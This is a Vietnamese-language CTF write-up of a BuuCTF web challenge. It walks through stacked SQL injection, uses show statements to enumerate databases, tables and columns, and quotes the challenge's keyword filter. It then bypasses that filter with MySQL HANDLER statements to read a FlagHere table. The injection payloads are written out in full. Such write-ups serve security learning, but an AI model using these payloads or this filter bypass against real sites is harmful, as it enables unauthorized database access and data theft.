![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/a858f841-39ba-492c-9e84-027c2702218e)

Vào challenge thì ta có 1 form để điền, đây là Stacked injections. Nguyên tắc là thêm một dấu chấm phẩy sau khi câu lệnh ban đầu được tạo để biểu thị phần cuối của câu lệnh, và một câu lệnh sql hoàn toàn mới sẽ được nhập vào sau đó, tại thời điểm này, không có giới hạn cho việc thêm, xóa, sửa và kiểm tra.

``1';show databases;#``

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/0dae55fb-0597-46f8-97e9-3e5b4a682764)

``1';show tables;#``

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/e174945b-ecfd-4a8d-9a19-0d8e8c92a9a1)

Ta có thể thấy bảng ``FlagHere`` khá là đáng nghi nên sẽ show các dòng trong bảng ra.

``1';show columns from FlagHere;#``

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/b130a214-4592-4ab4-8a7a-7a76342cf864)

Mình đã sử dụng ``select`` để thực hiện truy vấn nhưng nó đã bị filter, do đó phải tìm 1 cách khác.

``return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);``

Trong trường hợp này mình sử dụng HANDLER:

Ví dụ, HANDLER tbl_name OPEN mở một bảng mà không trả về kết quả, thực tế là chúng ta khai báo một handle có tên tb1_name ở đây.

Nhận dòng đầu tiên của thẻ điều khiển thông qua HANDLER tbl_name READ FIRST và lần lượt nhận các dòng khác thông qua READ NEXT. Thực thi NEXT sau khi dòng cuối cùng được thực thi sẽ trả về kết quả trống.

Đóng tay cầm đang mở bằng HANDLER tbl_name CLOSE.

``1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;``

![image](https://github.com/elliSzAt/Writeup-BuuCTF/assets/125866921/77287fc6-7a20-4328-a0b1-3dce309df3f1)
